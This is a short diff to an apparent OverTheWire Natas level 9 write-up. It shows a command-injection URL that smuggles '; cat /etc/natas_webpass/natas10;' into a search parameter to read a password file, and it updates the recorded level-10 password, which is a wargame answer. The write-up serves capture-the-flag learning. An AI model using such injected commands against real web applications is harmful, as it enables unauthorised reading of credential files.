@@ -4,4 +4,4 @@ a "cat /etc/natas_webpass/natas10 ; " to dump out the password.
 
 http://natas9.natas.labs.overthewire.org/?needle=%3B+cat+%2Fetc%2Fnatas_webpass%2Fnatas10%3B&submit=Search
 
-Password for natas10 is nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
+Password for natas10 is EgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv
